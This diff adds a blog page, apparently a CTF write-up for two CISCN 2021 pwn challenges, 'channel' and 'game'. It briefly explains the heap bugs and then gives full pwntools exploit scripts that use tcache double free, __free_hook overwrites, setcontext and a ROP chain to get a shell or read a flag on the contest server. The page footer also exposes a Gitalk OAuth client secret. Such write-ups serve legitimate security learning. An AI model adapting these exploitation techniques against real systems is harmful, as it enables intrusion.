@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>ciscn2021-pwn-wp - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="国赛初赛 出了两道题目,game最后远程堆环境不一致没通,属实恶心">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn2021-pwn-wp">
+<meta property="og:url" content="http://shiroinu.top/2021/05/16/ciscn2021-pwn-wp/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="国赛初赛 出了两道题目,game最后远程堆环境不一致没通,属实恶心">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-05-16T13:14:53.495Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ciscn2021-pwn-wp">
+<meta name="twitter:description" content="国赛初赛 出了两道题目,game最后远程堆环境不一致没通,属实恶心">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1621172060427">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>26</div>
+        <div><span>标签</span>3</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/others/" style="font-size: 10px;">others</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2021 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>ciscn2021-pwn-wp</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年05月16日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.8k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 10 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>国赛初赛 出了两道题目,game最后远程堆环境不一致没通,属实恶心</p>
+<a id="more"></a>
+<p>本地与远程环境普遍存在堆环境不同的情况,主要原因是本地存在一个size = 0x410的缓冲区chunk,远程则没有,在计算偏移时需要根据需要加减0x410(或者0x400)的偏移量<br>大概是:</p>
+<ol>
+<li>计算heap_base时因为泄露的是堆地址,远程少了0x410,<strong>即本地多减了</strong>,应该加上,低字节如果被覆写那么就只+0x400</li>
+<li>在payload中写入一个相对于heap_base的堆地址时,因为本地堆块地址相对远程多了0x410,<strong>即本地多加了</strong>,所以远程要减去0x410<h1 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h1>偏移为0x100的链表next指针在free时不会清空，因此可以先free之后利用write将其malloc出来修改next指针达成任意地址free<br>选择在0x110的chunk中伪造一个小chunk，通过固定的key来free小chunk，然后大chunk堆重叠反复malloc free达成edit的效果修改小chunk的bk指针，达成tcache double free<br>最后写free_hook getshell</li>
+</ol>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+context.arch = &#39;aarch64&#39;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+context.log_level = &#39;DEBUG&#39;
+libc = ELF(&#39;./lib/libc.so.6&#39;)
+cmd = &quot;qemu-aarch64 -g 1234 -L ./ ./channel&quot;.split()
+# sh = process(cmd)
+sh = remote(&quot;124.71.235.219&quot;,24467)
+def add(key):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;key&gt; \n&#39;)
+    sh.send(key)
+    sh.recvuntil(&#39;&gt; &#39;)
+def delete(key):
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&#39;key&gt; \n&#39;)  
+    sh.send(key)
+    sh.recvuntil(&#39;&gt; &#39;,timeout=1)
+def readd(key):
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&#39;key&gt; \n&#39;)  
+    sh.send(key)
+def writed(key,size,content):
+    sh.sendline(&#39;4&#39;)
+    sh.recvuntil(&#39;key&gt; \n&#39;)  
+    sh.send(key)
+    sh.recvuntil(&#39;len&gt; \n&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;content&gt; \n&#39;)
+    sh.send(content)
+    sh.recvuntil(&#39;&gt; &#39;)
+pause()
+#0x4000853802
+for i in range(11):
+    add(str(i) + &#39;\x00&#39;)
+for i in range(7,-1,-1):
+    delete(str(i) + &#39;\x00&#39;)
+for i in range(6):
+    add(str(i) + &#39;\x00&#39;)
+add(&#39;/bin/sh\x00&#39;)
+writed(&#39;9\x00&#39;,0x90,&#39;\n&#39;)
+readd(&#39;9\x00&#39;)
+libc_base = u64(sh.recv(3).ljust(8,b&#39;\x00&#39;)) + 0x4000000000 - libc.symbols[&#39;__malloc_hook&#39;] + 0x7FE
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+
+delete(&#39;1\x00&#39;)
+delete(&#39;2\x00&#39;)
+writed(&quot;3\x00&quot;,0x110,&#39;\n&#39;)
+readd(&quot;3\x00&quot;)
+heap_base = u64(sh.recv(3).ljust(8,b&#39;\x00&#39;)) + 0x4000000000 - 0x60a - 0x200 + 0x400 # +0x400 -&gt; case 1
+sh.recvuntil(&#39;&gt; &#39;)
+log.success(&#39;heap_base = &#39; + hex(heap_base))
+payload = p64(0) * 2 + p64(0) + p64(0x41)
+payload = payload.ljust(0x100,b&#39;\x00&#39;)
+payload += p64(heap_base + 0x910 -0x410) + p64(0) # -0x410 -&gt; case 2
+writed(&quot;4\x00&quot;,0x110,payload)
+payload = p64(0) * 28 + p64(heap_base + 0x910 -0x410) + p64(0) * 2 + p64(0x121)
+delete(payload)
+payload2 = p64(0)*2 + p64(0) + p64(0x41) + p64(0) + p64(heap_base + 0x10)
+payload2 = payload2.ljust(0x100,b&#39;\x00&#39;)
+delete(payload2)
+payload2 = p64(0) * 2 + p64(0) + p64(0x41) + p64(0) + p64(0)
+payload2 = payload2.ljust(0x100,b&#39;\x00&#39;)
+writed(&quot;4\x00&quot;,0x110,payload2)
+delete(payload)
+payload2 = p64(0) * 2 +p64(0) + p64(0x41) + p64(heap_base + 0x910 -0x410) + p64(heap_base + 0x10)
+payload2 = payload2.ljust(0x100,b&#39;\x00&#39;)
+delete(payload2)
+
+payload2 = p64(0) * 2 +p64(0) + p64(0x41) + p64(heap_base + 0x910 -0x410) + p64(0)
+payload2 = payload2.ljust(0x100,b&#39;\x00&#39;)
+writed(&quot;4\x00&quot;,0x110,payload2)
+payload = p64(heap_base + 0x910 -0x410)+ p64(0) *27 + p64(heap_base + 0x910 -0x410) + p64(0) * 2 + p64(0x121)
+delete(payload)
+
+payload = p64(libc_base + libc.symbols[&#39;__free_hook&#39;])
+system = libc_base + libc.symbols[&quot;system&quot;]
+writed(&quot;4\x00&quot;,0x30,payload)
+writed(&quot;4\x00&quot;,0x30,&#39;\n&#39;)
+writed(&quot;4\x00&quot;,0x30,p64(system))
+delete(&#39;/bin/sh\x00&#39;)
+sh.interactive()
+</code></pre>
+<h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>vm题,开启了沙箱,主要逻辑是<code>op:数字\n</code>代表选项,对应有创建迷宫/创建角色/上下左右移等<br>主要两个结构体</p>
+<pre><code>00000000 game            struc ; (sizeof=0x18, mappedto_8)
+00000000 map_ptr         dq ?
+00000008 l               db ?
+00000009 w               db ?
+0000000A pad             db 6 dup(?)
+00000010 player_header   dq ?
+00000018 game            ends
+
+
+00000000 player          struc ; (sizeof=0x20, mappedto_9)
+00000000 id              db ?
+00000001 pad             db 7 dup(?)
+00000008 desc_ptr        dq ?
+00000010 next_player     dq ?
+00000018 desc_len        dd ?
+0000001C x               db ?
+0000001D y               db ?
+0000001E pad2            dw ?
+00000020 player          ends</code></pre><p>漏洞点就在于上下左右移没有边界检测,可以越出迷宫的范围修改堆上的字节,我选择修改两个player的desc_ptr指向同一个chunk,double free,之后就__free_hook + setcontext + rop即可</p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+
+# sh = process(&quot;./game&quot;)
+# sh = process(&quot;./game&quot;, env = {&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;})
+sh = remote(&quot;124.71.235.219&quot;,24554)
+
+libc = ELF(&#39;./libc-2.27.so&#39;)
+
+def create_map(weight,length):
+    payload = &quot;op:1\n&quot;
+    payload += &quot;w:&quot; + str(weight) + &#39;\n&#39;
+    payload += &quot;l:&quot; + str(length) + &quot;\n&quot;
+    sh.sendline(payload)
+    sh.recvuntil(&quot;cmd&gt; &quot;)
+
+def create_player(idd,size,desc):
+    payload = &quot;op:2\n&quot;
+    payload += &quot;id:&quot; + str(idd) + &quot;\n&quot;
+    payload += &quot;s:&quot; + str(size) + &quot;\n&quot;
+    sh.sendline(payload)
+    sh.recvuntil(&quot;desc&gt; &quot;)
+    sh.send(desc)
+    sh.recvuntil(&quot;cmd&gt; &quot;)
+
+def delete_player(idd):
+    payload = &quot;op:3\n&quot;
+    payload += &quot;id:&quot; + str(idd) + &#39;\n&#39;
+    sh.sendline(payload)
+    sh.recvuntil(&quot;cmd&gt; &quot;,timeout=1)
+
+def show():
+    payload = &quot;op:4\n&quot;
+    sh.sendline(payload)
+    # sh.recvuntil(&quot;cmd&gt; &quot;)
+
+def clear_heap():
+    for i in range(6):
+        create_player(1,0x10,&quot;a\x00&quot;)
+    for i in range(6):
+        create_player(2,0x30,&quot;a\x00&quot;)
+    create_player(3,0x50,&quot;a\x00&quot;)
+    for i in range(4):
+        create_player(3,0x60,&quot;a\x00&quot;)
+    create_player(3,0x60,&quot;zz\x00&quot;)
+    create_player(3,0x60,&quot;a\x00&quot;)
+    create_player(3,0x60,&quot;a\x00&quot;)
+    for i in range(4):
+        create_player(5,0x70,&quot;a\x00&quot;)
+    create_player(4,0x70,&quot;zz\x00&quot;)
+    create_player(5,0x70,&quot;a\x00&quot;)
+    create_player(5,0x70,&quot;a\x00&quot;)
+
+    for i in range(4):
+        create_player(6,0xc0,&quot;a\x00&quot;)
+    for i in range(5):
+        create_player(7,0xe0,&quot;a\x00&quot;)
+    # create_player(8,0x400,&quot;a\x00&quot;)
+    # for i in range(8):
+    #     create_player(1,0x10,&quot;a\x00&quot;)
+    # for i in range(8):
+    #     create_player(1,0x60,&quot;a\x00&quot;)
+    # create_player(1,0x70,&quot;a\x00&quot;)
+
+def go_right(idd):
+    payload = &quot;op:8\n&quot;
+    payload += &quot;id:&quot; + str(idd) + &#39;\n&#39;
+    sh.sendline(payload)
+    sh.recvuntil(&quot;cmd&gt; &quot;)
+
+def go_left(idd):
+    payload = &quot;op:7\n&quot;
+    payload += &quot;id:&quot; + str(idd) + &#39;\n&#39;
+    sh.sendline(payload)
+    sh.recvuntil(&quot;cmd&gt; &quot;)
+
+def go_down(idd):
+    payload = &quot;op:6\n&quot;
+    payload += &quot;id:&quot; + str(idd) + &#39;\n&#39;
+    sh.sendline(payload)
+    sh.recvuntil(&quot;cmd&gt; &quot;)
+
+def go_up(idd):
+    payload = &quot;op:5\n&quot;
+    payload += &quot;id:&quot; + str(idd) + &#39;\n&#39;
+    sh.sendline(payload)
+    sh.recvuntil(&quot;cmd&gt; &quot;)
+
+def get_xx_off(idd):
+    show()
+    sh.recvuntil(str(idd) + &quot;: (&quot;)
+    x = int(sh.recvuntil(&#39;,&#39;,drop=True))
+    y = int(sh.recvuntil(&quot;)&quot;,drop=True))
+    sh.recvuntil(&quot;cmd&gt; &quot;)
+    return [x,y]
+
+def go(idd,src,tar,pos):
+    if(tar &gt; src):
+        off = tar - (src + pos[1] * 0x80 + pos[0])
+        yy  = off // 0x80 - 1
+        log.info(hex(yy))
+        xx = off % 0x80
+        log.info(hex(xx))
+
+        for i in range(xx) :
+            go_right(idd)
+        for i in range(yy):
+            go_down(idd)
+        go_down(idd)
+    else:
+        off = src + pos[1] * 0x80 + pos[0] - tar
+        yy  = off // 0x80
+        log.info(hex(yy))
+        xx = off % 0x80
+        log.info(hex(xx))
+        for i in range(yy):
+            go_up(idd)
+        for i in range(xx) :
+            go_left(idd)
+
+create_map(0x80,0x80)
+clear_heap()
+create_player(9,0x410,&#39;\n&#39;)
+delete_player(9)
+
+create_player(9,0x410,&#39;\n&#39;)
+show()
+sh.recvuntil(&quot;9: &quot;)
+sh.recvuntil(&#39;) &#39;)
+libc_base = u64(sh.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x3EBC0A
+libc.address = libc_base
+free_hook = libc.symbols[&#39;__free_hook&#39;]
+setcontext = libc.symbols[&#39;setcontext&#39;] + 53
+rdi_ret = 0x000000000002155f + libc_base
+rsi_ret = 0x0000000000023e8a + libc_base
+rdx_ret = 0x0000000000001b96 + libc_base
+syscall_ret = 0x00000000000d29d5 + libc_base
+rax_ret = 0x0000000000043a78 + libc_base
+ret = 0x00000000000008aa + libc_base
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+
+create_player(9,0x40,&#39;\n&#39;)
+create_player(9,0x40,&#39;\n&#39;)
+delete_player(9)
+delete_player(9)
+create_player(9,0x40,&#39;\n&#39;)
+show()
+sh.recvuntil(&quot;9: &quot;)
+sh.recvuntil(&#39;) &#39;)
+heap_base = u64(sh.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x690A - 0x100
+log.success(&quot;heap_base = &quot; + hex(heap_base))
+
+buf_addr = heap_base + 0x500
+rop_addr = heap_base + 0x6b80 + 0x90
+flag_addr = heap_base + 0x6B68 + 0x90
+rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) +p64(rax_ret) + p64(constants.SYS_open) + p64(syscall_ret)
+rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_ret) + p64(0x40) + p64(libc.symbols[&#39;read&#39;])
+rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_ret) + p64(0x40) + p64(libc.symbols[&#39;write&#39;])
+
+frame = SigreturnFrame()
+frame.rip = ret
+frame.rsp = rop_addr
+
+payload = bytes(frame) + b&#39;./flag\x00\x00&#39; + p64(0)*2 + rop
+log.info(hex(len(payload)))
+
+create_player(9,0x40,&#39;\n&#39;)
+create_player(0x80, 0x240, payload)
+pos = get_xx_off(0x80)
+print(pos)
+
+# gdb.attach(sh)
+
+go(0x80,0x521c0,0x56e68,pos)
+
+delete_player(9)
+delete_player(9)
+create_player(9,0x40,p64(free_hook))
+create_player(9,0x40,&#39;\n&#39;)
+create_player(9,0x40,p64(setcontext))
+
+payload = &quot;op:3\n&quot;
+payload += &quot;id:&quot; + str(0x80) + &#39;\n&#39;
+sh.sendline(payload)
+
+# gdb.attach(sh)
+
+sh.interactive()
+</code></pre>
+
+  </article>
+  
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1621172060430"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
